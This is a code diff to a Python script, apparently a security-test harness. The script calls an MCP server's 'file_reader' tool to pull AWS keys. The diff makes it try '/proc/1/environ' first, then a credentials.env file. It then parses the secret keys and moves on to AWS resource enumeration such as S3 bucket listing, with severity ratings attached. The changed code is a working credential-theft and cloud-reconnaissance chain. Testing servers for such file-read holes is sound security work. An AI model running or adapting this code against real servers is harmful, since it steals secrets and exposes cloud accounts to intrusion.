@@ -32,7 +32,10 @@ import botocore.exceptions
 from mcp.client.session import ClientSession
 from mcp.client.sse import sse_client
 
-CREDENTIALS_PATH = "/mnt/data/config/credentials.env"
+CREDENTIALS_PATHS = [
+    "/proc/1/environ",                    # process env (always present; used first)
+    "/mnt/data/config/credentials.env",   # EFS-backed (available after seed_secrets.sh)
+]
 
 AWS_RESOURCES = [
     ("s3",            "list_buckets",           {},  "S3 bucket enumeration",         "High"),
@@ -50,15 +53,15 @@ def _parse_args() -> argparse.Namespace:
     return parser.parse_args()
 
 
-async def _read_credentials_file(sse_url: str) -> tuple[str | None, str | None]:
-    """Read credentials.env via file_reader. Returns (content, error)."""
+async def _read_credentials_file(sse_url: str, path: str) -> tuple[str | None, str | None]:
+    """Read a credentials file via file_reader. Returns (content, error)."""
     try:
         async with asyncio.timeout(35):
             async with sse_client(sse_url) as (read, write):
                 async with ClientSession(read, write) as session:
                     await session.initialize()
                     result = await session.call_tool(
-                        "file_reader", {"path": CREDENTIALS_PATH}
+                        "file_reader", {"path": path}
                     )
                     if result.isError:
                         err = result.content[0].text if result.content else "tool error"
@@ -161,24 +164,30 @@ def main() -> None:
         m2_items: list[dict] = []
         detail_parts = []
 
-        # ── Step 1: Extract credentials via file_reader ───────────────
-        print(f"  Step 1 → file_reader(path={CREDENTIALS_PATH!r})")
-        cred_text, cred_err = asyncio.run(_read_credentials_file(sse_url))
+        # ── Step 1: Extract credentials via file_reader (try each path) ─
+        cred_text, cred_err, used_path = None, None, None
+        for cpath in CREDENTIALS_PATHS:
+            print(f"  Step 1 → file_reader(path={cpath!r})")
+            cred_text, cred_err = asyncio.run(_read_credentials_file(sse_url, cpath))
+            if cred_err:
+                print(f"    ✗ {cred_err}")
+            else:
+                used_path = cpath
+                break
 
-        if cred_err:
+        if cred_err or cred_text is None:
             outcome = "FAILED"
             detail_parts.append(
-                f"Step 1 FAILED: file_reader rejected — {cred_err}. "
+                f"Step 1 FAILED: file_reader rejected all paths — {cred_err}. "
                 "Cannot proceed to AWS API calls without credentials."
             )
-            print(f"    ✗ {cred_err}")
         else:
             # ── Step 2: Parse credentials ──────────────────────────────
             creds = _parse_credentials(cred_text or "")
             key_id  = creds.get("AWS_ACCESS_KEY_ID", "")
             secret  = creds.get("AWS_SECRET_ACCESS_KEY", "")
-            print(f"    ✓ Extracted key_id={key_id[:8]}... from credentials.env")
-            detail_parts.append(f"Step 1 SUCCESS: credentials parsed (key_id={key_id[:8]}...)")
+            print(f"    ✓ Extracted key_id={key_id[:8]}... from {used_path}")
+            detail_parts.append(f"Step 1 SUCCESS: credentials parsed from {used_path} (key_id={key_id[:8]}...)")
 
             if not key_id or not secret:
                 outcome = "ERROR"
